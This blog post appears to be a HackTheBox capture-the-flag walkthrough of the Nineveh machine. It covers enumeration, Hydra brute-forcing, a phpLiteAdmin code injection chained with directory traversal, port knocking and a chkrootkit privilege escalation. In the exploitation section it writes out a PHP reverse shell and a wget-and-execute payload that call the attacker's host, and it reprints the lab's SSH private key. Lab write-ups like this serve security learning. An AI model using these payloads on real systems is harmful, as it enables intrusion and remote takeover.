---
layout: post
title: "HackTheBox - Nineveh writeup"
subtitle: "~ Walkthrough of Nineveh machine from HackTheBox ~"
date: 2017-12-16
author: V3ded
category: CTF
tags: blog ctf pentesting hackthebox
finished: true
excerpt_separator: <!--more-->
---

<img src="/img/blog/htb-nineveh/htb-nineveh-00.png" width="417" height="136">
# Introduction
I'm running out of these slowly but surely. No introduction this time, just the blog itself. Enjoy! <!--more-->

***

# Scanning & Enum

Obtain the `Nineveh's` IP (**10.10.10.43**) from HackTheBox dashboard and nmap it:
```console
root@EdgeOfNight:~# nmap 10.10.10.43 -A -sS -T4 

Starting Nmap 7.50 ( https://nmap.org ) at 2017-12-15 15:13 CST
Nmap scan report for 10.10.10.43
Host is up (0.20s latency).
Not shown: 998 filtered ports
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Not valid before: 2017-07-01T15:03:30
|_Not valid after:  2018-07-01T15:03:30
|_ssl-date: TLS randomness does not represent time
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.8 (92%), Linux 3.13 (92%), Linux 3.2 - 4.8 (92%), Linux 4.4 (92%), Linux 3.12 (90%), Linux 3.13 or 4.2 (90%), Linux 3.16 (90%), Linux 3.16 - 4.6 (90%), Linux 3.18 (90%), Linux 3.8 - 3.11 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   101.81 ms 10.10.14.1
2   291.88 ms 10.10.10.43

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.08 seconds
```
> HTTP on port 80 and HTTPS on 443

***

### - HTTP (80)
Pretty common procedure with web servers is to run any directory bruteforcing tool (gobuster in my case) and find possibly hidden directories:
```console
root@EdgeOfNight:~# gobuster -e -u 10.10.10.43 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 25

Gobuster v1.2                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.43/
[+] Threads      : 25
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 301,302,307,200,204
[+] Expanded     : true
=====================================================
http://10.10.10.43/department (Status: 301)
```
> Install gobuster by: apt-get install gobuster

`/department/` directory presents us with what looks like a custom login page:

<a href="/img/blog/htb-nineveh/htb-nineveh-01.png" target="_blank"><img class="centerImgLarge" src="/img/blog/htb-nineveh/htb-nineveh-01.png"></a>

I carried out multiple tests and  luckily for the owner the login function is not vulnerable to SQL injections. However if you look closely, you may notice a very minor flaw which allows for username enumeration. This can be observed after entering invalid credentials / usernames.

<a href="/img/blog/htb-nineveh/htb-nineveh-02.png" target="_blank"><img class="centerImgMedium" src="/img/blog/htb-nineveh/htb-nineveh-02.png"></a>

When you try to login with a name that doesn't exist (for example v3ded) you will get a message saying: `invalid username`. Notice the difference in the image below where I try to login as admin: 

<a href="/img/blog/htb-nineveh/htb-nineveh-03.png" target="_blank"><img class="centerImgMedium" src="/img/blog/htb-nineveh/htb-nineveh-03.png"></a>

The login page is telling us which users exist and which do not! After confirming that the *admin* username is correct I start a bruteforce attack via Hydra.
```console
root@EdgeOfNight:~# hydra 10.10.10.43 -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid Password!" -V

Hydra v8.5 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
Hydra (http://www.thc.org/thc-hydra) starting at 2017-12-15 15:52:15
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking service http-post-form on port 80
[DATA] with additional data /department/login.php:username=^USER^&password=^PASS^:Invalid Password!
[ATTEMPT] target 10.10.10.43 - login "admin" - pass "123456" - 1 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.10.43 - login "admin" - pass "12345" - 2 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.10.43 - login "admin" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.10.43 - login "admin" - pass "password" - 4 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.10.43 - login "admin" - pass "iloveyou" - 5 of 14344399 [child 4] (0/0)
[ATTEMPT] target 10.10.10.43 - login "admin" - pass "princess" - 6 of 14344399 [child 5] (0/0)
[ATTEMPT] target 10.10.10.43 - login "admin" - pass "1234567" - 7 of 14344399 [child 6] (0/0)
[ATTEMPT] target 10.10.10.43 - login "admin" - pass "rockyou" - 8 of 14344399 [child 7] (0/0)
[ATTEMPT] target 10.10.10.43 - login "admin" - pass "12345678" - 9 of 14344399 [child 8] (0/0)
[ATTEMPT] target 10.10.10.43 - login "admin" - pass "abc123" - 10 of 14344399 [child 9] (0/0)
[ATTEMPT] target 10.10.10.43 - login "admin" - pass "nicole" - 11 of 14344399 [child 10] (0/0)
[ATTEMPT] target 10.10.10.43 - login "admin" - pass "daniel" - 12 of 14344399 [child 11] (0/0)
[ATTEMPT] target 10.10.10.43 - login "admin" - pass "babygirl" - 13 of 14344399 [child 12] (0/0)
[ATTEMPT] target 10.10.10.43 - login "admin" - pass "monkey" - 14 of 14344399 [child 13] (0/0)
[ATTEMPT] target 10.10.10.43 - login "admin" - pass "lovely" - 15 of 14344399 [child 14] (0/0)
[ATTEMPT] target 10.10.10.43 - login "admin" - pass "jessica" - 16 of 14344399 [child 15] (0/0)
[ATTEMPT] target 10.10.10.43 - login "admin" - pass "654321" - 17 of 14344399 [child 15] (0/0)
... [Many attempts later] ...
[ATTEMPT] target 10.10.10.43 - login "admin" - pass "candys" - 4579 of 14344399 [child 12] (0/0)
[ATTEMPT] target 10.10.10.43 - login "admin" - pass "bonnie1" - 4580 of 14344399 [child 11] (0/0)
[ATTEMPT] target 10.10.10.43 - login "admin" - pass "1truelove" - 4581 of 14344399 [child 8] (0/0)
[80][http-post-form] host: 10.10.10.43   login: admin   password: 1q2w3e4r5t
1 of 1 target successfully completed, 1 valid password found
```

It "only" took 10 minutes until the correct password showed on my screen - `admin:1q2w3e4r5t`. Upon logging in we are present with an under-construction admin dashboard: 

<a href="/img/blog/htb-nineveh/htb-nineveh-04.png" target="_blank"><img class="centerImgMedium" src="/img/blog/htb-nineveh/htb-nineveh-04.png"></a>

and "Notes":

<a href="/img/blog/htb-nineveh/htb-nineveh-05.png" target="_blank"><img class="centerImgLarge" src="/img/blog/htb-nineveh/htb-nineveh-05.png"></a>

While the webpage might look nice, it's not of any use to us now. I just note down that we gained access and move onto *443*.

### - HTTPS (443)
```https://10.10.10.43:443/``` is a static webpage with a single image:

<a href="/img/blog/htb-nineveh/htb-nineveh-06.png" target="_blank"><img class="centerImgLarge" src="/img/blog/htb-nineveh/htb-nineveh-06.png"></a>

Once again, use directory bruteforcing to find anything interesting:
```console
root@EdgeOfNight:~#  gobuster -e -u 10.10.10.43:443 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20

Gobuster v1.2                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.43:443/
[+] Threads      : 20
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307
[+] Expanded     : true
=====================================================
http://10.10.10.43:443/db (Status: 200)
```

`/db/` sounds interesting:

<a href="/img/blog/htb-nineveh/htb-nineveh-07.png" target="_blank"><img class="centerImgHuge" src="/img/blog/htb-nineveh/htb-nineveh-07.png"></a>

This `PHP LiteAdmin` is running version 1.9 which after doing a searchploit query is vulnerable to multiple exploits. 

```console
root@EdgeOfNight:~# searchsploit php Lite Admin 1.9
---------------------------------------------------------------------------------------------
 Exploit Title                                           |  Path
                                                         | (/usr/share/exploitdb/platforms/)
---------------------------------------------------------------------- ----------------------
PHPLiteAdmin 1.9.3 - Remote PHP Code Injection           | php/webapps/24044.txt
phpLiteAdmin 1.9.6 - Multiple Vulnerabilities            | php/webapps/39714.txt
---------------------------------------------------------------------- ----------------------
```
From `PHPLiteAdmin 1.9.3 - Remote PHP Code Injection`:
```console
An Attacker can create a sqlite Database with a php extension and insert PHP Code as text fields. When done the Attacker can execute it simply by access the database file with the Webbrowser.

Proof of Concept:

1. We create a db named "hack.php".
(Depending on Server configuration sometimes it will not work and the name for the db will be "hack.sqlite". Then simply try to rename the database / existing database to "hack.php".)
The script will store the sqlite database in the same directory as phpliteadmin.php.

2. Now create a new table in the database and insert a text field with the default value:
<?php phpinfo()?>
```

Fortunately for me I've encountered same exploit once already in one of my other blogs - [zico2](https://v3ded.github.io/ctf/zico2.html){:target="_blank"}. It's a lengthy process of creating a database which is then miss-translated into php code that gets executed on a target server. But for all of this to work we need to be authenticated first! Fire our good old hydra again :-).

```console
root@EdgeOfNight:~# hydra 10.10.10.43 -l whatever -P /usr/share/wordlists/rockyou.txt https-post-form "/db/:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password." -V -s 443

Hydra v8.5 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
Hydra (http://www.thc.org/thc-hydra) starting at 2017-12-16 07:35:48
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking service http-post-form on port 443 with SSL
[DATA] with additional data /db/:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password.
[ATTEMPT] target 10.10.10.43 - login "whatever" - pass "123456" - 1 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.10.43 - login "whatever" - pass "12345" - 2 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.10.43 - login "whatever" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.10.43 - login "whatever" - pass "password" - 4 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.10.43 - login "whatever" - pass "iloveyou" - 5 of 14344399 [child 4] (0/0)
[ATTEMPT] target 10.10.10.43 - login "whatever" - pass "princess" - 6 of 14344399 [child 5] (0/0)
... [Many attempts later] ...
[ATTEMPT] target 10.10.10.43 - login "whatever" - pass "esteban" - 1399 of 14344399 [child 5] (0/0)
[ATTEMPT] target 10.10.10.43 - login "whatever" - pass "mookie" - 1400 of 14344399 [child 13] (0/0)
[443][http-post-form] host: 10.10.10.43   login: whatever   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2017-12-16 07:46:08


```
> Note: login name (-l) doesn't matter as we do not need it in our http request. Hydra just requires it in it's syntax and therefore now it's irrelevant! 

Use **password123** and we are inside the `PHP LiteAdmin` dashboard: 

<a href="/img/blog/htb-nineveh/htb-nineveh-08.png" target="_blank"><img class="centerImgHuge" src="/img/blog/htb-nineveh/htb-nineveh-08.png"></a>

Time to do some damage!

***

# Exploitation

There are many methods one can choose in order to compromise the application, but I went with the following:

* Make our own **.txt** backdoor file inside */var/www/html* with `<?php $sock=fsockopen("YOUR IP",1234);exec("/bin/sh -i <&3 >&3 2>&3");?>` as the content 
* Start apache2 - `/etc/init.d/apache2 start`
* Make the target download (wget) our **.txt** file, save it as **.php** and run it

> Note: If you save the file as **.php** it would get activated on your own server when you wget it later on - **be careful about it**. That's why we save it as **.txt** and output it to **.php**.

To proceed with the exploitation do as the exploitdb file says. Create a database with *.php* extension (I named it shell.php, name doesn't matter!):

<a href="/img/blog/htb-nineveh/htb-nineveh-09.png" target="_blank"><img class="centerImgTiny" src="/img/blog/htb-nineveh/htb-nineveh-09.png"></a>

Click on our newly created database under *Change Database* and add a table inside called shell, select 1 field:

<a href="/img/blog/htb-nineveh/htb-nineveh-10.png" target="_blank"><img class="centerImgLarge" src="/img/blog/htb-nineveh/htb-nineveh-10.png"></a>

Name the field whatever we wish, set it as text type, put `<?php system("wget YOURIP/shell.txt -O /tmp/shell.php; php /tmp/shell.php"); ?>` into the default value & click create. This should create a new table with our exploit. ***The default value script plays a huge role here as it is used to download our main php reverse shell.***

<a href="/img/blog/htb-nineveh/htb-nineveh-11.png" target="_blank"><img class="centerImgLarge" src="/img/blog/htb-nineveh/htb-nineveh-11.png"></a>

`wget - downloads the the main file on the target machine`

`-O /tmp/shell.php - converts the text file into php so we can execute it and saves it inside /tmp folder`

`;php /tmp/shell.php - runs the php file with our malicious payload inside`

> Note: Make sure you use `-O` (capital) because `-o` has different output which won't work!
 
To activate our php script that downloads the malicious file, an HTTP request is needed. How would we do such thing though? Remember the previous dashboard we found on port 80? Look at the url after clicking "Notes":

<a href="/img/blog/htb-nineveh/htb-nineveh-12.png" target="_blank"><img class="centerImgMedium" src="/img/blog/htb-nineveh/htb-nineveh-12.png"></a>

It seems innocent but I immediately noticed a possible directory traversal vulnerability which indeed worked. After accessing the uploaded shell (either using a browser or curl) the php got activated and we got a shell!
```console
root@EdgeOfNight:# curl 10.10.10.43/department/manage.php?notes=files/ninevehNotes.php/../../../../../../var/tmp/shell.php
```
> Note: Change ninevehNotes.txt into ninevehNotes.php 

<a href="/img/blog/htb-nineveh/htb-nineveh-13.png" target="_blank"><img class="centerImgMedium" src="/img/blog/htb-nineveh/htb-nineveh-13.png"></a>

***

# Privilege escalation

### - Shorter method

Do `ls -la /`
```console
$ ls -la
total 100
drwxr-xr-x  24 root   root    4096 Jul  2 21:07 .
drwxr-xr-x  24 root   root    4096 Jul  2 21:07 ..
drwxr-xr-x   2 root   root    4096 Jul  2 18:05 bin
drwxr-xr-x   3 root   root    4096 Jul  2 18:20 boot
drwxr-xr-x  19 root   root    4240 Dec 16 08:02 dev
drwxr-xr-x  93 root   root    4096 Aug  5 10:18 etc
drwxr-xr-x   3 root   root    4096 Jul  2 18:41 home
lrwxrwxrwx   1 root   root      32 Jul  2 17:58 initrd.img -> boot/initrd.img-4.4.0-62-generic
drwxr-xr-x  22 root   root    4096 Jul  2 18:05 lib
drwxr-xr-x   2 root   root    4096 Jul  2 19:48 lib64
drwx------   2 root   root   16384 Jul  2 17:57 lost+found
drwxr-xr-x   3 root   root    4096 Jul  2 17:58 media
drwxr-xr-x   2 root   root    4096 Feb 15  2017 mnt
drwxr-xr-x   2 root   root    4096 Feb 15  2017 opt
dr-xr-xr-x 203 root   root       0 Dec 16 08:02 proc
drwxr-xr-x   2 amrois amrois  4096 Dec 16 08:54 report
drwx------   4 root   root    4096 Jul 19 05:05 root
drwxr-xr-x  23 root   root     840 Dec 16 08:02 run
drwxr-xr-x   2 root   root   12288 Jul  2 18:20 sbin
drwxr-xr-x   2 root   root    4096 Jan 14  2017 snap
drwxr-xr-x   2 root   root    4096 Feb 15  2017 srv
dr-xr-xr-x  13 root   root       0 Dec 16 08:02 sys
drwxrwxrwt   9 root   root    4096 Dec 16 08:54 tmp
drwxr-xr-x  10 root   root    4096 Jul  2 17:58 usr
drwxr-xr-x  14 root   root    4096 Jul  2 18:49 var
lrwxrwxrwx   1 root   root      29 Jul  2 17:58 vmlinuz -> boot/vmlinuz-4.4.0-62-generic
```

A directory that immediately stands out is `report` owned by the user `amrois`. After viewing one of the files inside the dir, we get this output:
```console
ROOTDIR is `/'
Checking `amd'... not found
Checking `basename'... not infected
Checking `biff'... not found
Checking `chfn'... not infected
Checking `chsh'... not infected
Checking `cron'... not infected
Checking `crontab'... not infected
Checking `date'... not infected
Checking `du'... not infected
Checking `dirname'... not infected
Checking `echo'... not infected
Checking `egrep'... not infected
Checking `env'... not infected
Checking `find'... not infected
Checking `fingerd'... not found
[...A lot more output...]
```
This is standard output of `chkrootkit` which to my knowledge is vulnerable to a privilege escalation bug - <a href="https://www.exploit-db.com/exploits/33899/" target="_blank">https://www.exploit-db.com/exploits/33899/</a>. The link describes it pretty well and therefore I don't think other explanation is needed! Go and escalate! 

***

### - Longer method

There is an email left for `amrois` inside `/var/mail/amrois`. Simply *cat* it:

```console
$ cat /var/mail/amrois
From root@nineveh.htb  Fri Jun 23 14:04:19 2017
Return-Path: <root@nineveh.htb>
X-Original-To: amrois
Delivered-To: amrois@nineveh.htb
Received: by nineveh.htb (Postfix, from userid 1000)
        id D289B2E3587; Fri, 23 Jun 2017 14:04:19 -0500 (CDT)
To: amrois@nineveh.htb
From: root@nineveh.htb
Subject: Another Important note!
Message-Id: <20170623190419.D289B2E3587@nineveh.htb>
Date: Fri, 23 Jun 2017 14:04:19 -0500 (CDT)

Amrois! please knock the door next time! 571 290 911
```
This is a reference to [port knocking](https://en.wikipedia.org/wiki/Port_knocking){:target="_blank"}. A certain port can be opened (in Nineveh's case SSH - from `cat /etc/knockd.conf`) by using a correct knocking combination. You can do this by using nmap for example:

```console
root@EdgeOfNight:~# nmap -Pn --host-timeout 201 --max-retries 0 -p 571,290,911 10.10.10.43
```

If you nmap the target after the knock you will notice that SSH is open. Now we just need the password for SSH... Hydra again? No! Finding the key is tricky - you need to run `strings` command on 
`/var/www/ssl/secure_notes/nineveh.png`.
```console
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
-----END RSA PRIVATE KEY-----
```
Now using the combination of nmap and ssh you can easily log into the machine:
```console
root@EdgeOfNight:~# nmap -Pn --host-timeout 201 --max-retries 0 -p 571,290,911 10.10.10.43 && ssh -i sshkey.key amrois@10.10.10.43 
```
> Note: If you get an error saying "the .key file is unprotected", simply chmod it to 600

After authenticating You can get the user flag and use the same `chkrootkit` escalation method as before!

### Congratulations!
***

# Conclusion

I loved this box! It took me a bit longer to escalate and find the SSH RSA key but what can one do, right? Hopefully you can say the same. If you have any questions leave them down in the comments or get in contact with me via the [about](https://v3ded.github.io/about/){:target="_blank"} page.

~V3
